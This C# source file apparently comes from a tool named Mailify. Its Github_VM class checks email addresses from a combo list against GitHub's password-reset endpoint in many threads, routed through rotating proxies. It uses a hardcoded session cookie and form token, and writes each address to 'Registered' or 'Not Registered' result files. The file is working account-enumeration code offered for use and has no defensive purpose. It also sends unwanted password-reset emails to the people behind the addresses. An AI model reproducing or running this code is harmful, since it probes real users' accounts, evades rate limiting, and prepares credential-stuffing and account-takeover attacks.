using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Github_VM
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;


            new Thread(() => Variables.VM_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var request = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    request.Proxy.ConnectTimeout = proxyTimeout;
                    request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    request.AddHeader("cookie", "_octo=GH1.1.527326724.1616517380; logged_in=no; tz=America%2FToronto; _device_id=fe1a610e9e6f78ae305cb5c48e526096; _gh_sess=ukMLMWG9VFgkpsGlJrsSC6uJsAp8aCJbXrSQWmYn64mUTmDGpytlspvpRJHiX1uB2Kxq23TjfJF9WIme%2BuW6XigFAu%2FhqxfyMNhbeQb%2FxoEJq8rS1GWganQ3NPltwWhYPTnBZrGTPekZZVwJTINy%2BfyBy1AYY0m8jSOKJ4jtLNfM19qkZODv1pegbwgkBQYQSv%2BGvOb9Hvr1vIxupFbC77iNzQrgd6NkBVo07ue3xxrg4KM7z8v9B4D00CQDjUvLYmOX70CFPIVqjTjTIIEcNRcU%2BHTgAQ5r1u%2FxoEuebwNmOl35--rdYtkLrVizHLv5Sw--87%2BPCNXTVo7fuEdoMdUf%2Bw%3D%3D");
                    string check = request.Post("https://github.com/password_reset", $"commit=Send+password+reset+email&authenticity_token=idJJKCQ%2FlkKIAll8aACfvnFNybcIPH%2Flnn39DFpmGyEScNuSvTZyY4pAWQbpP1%2BedXsnTxvlIrLCIgK7S6wiWg%3D%3D&email={credentials[0]}&commit=Send+password+reset+email&required_field_9496=&timestamp=1616971763202&timestamp_secret=52a06b3fd7015f9df0a021139df29b36743a4cf869a5ea5ec379cabfb87b899b", "application/x-www-form-urlencoded").ToString();

                    if (check.Contains("That address is not a <a href='https://docs.github.com/en/github/setting-up-and-managing-your-github-user-account/changing-your-primary-email-address'>verified primary email</a> or is not associated with a <a href='https://docs.github.com/en/github/getting-started-with-github/types-of-github-accounts'>personal user account"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Not Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (check.Contains("Check your email for a link to reset your password. If it doesn’t appear within a few minutes, check your spam folder."))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}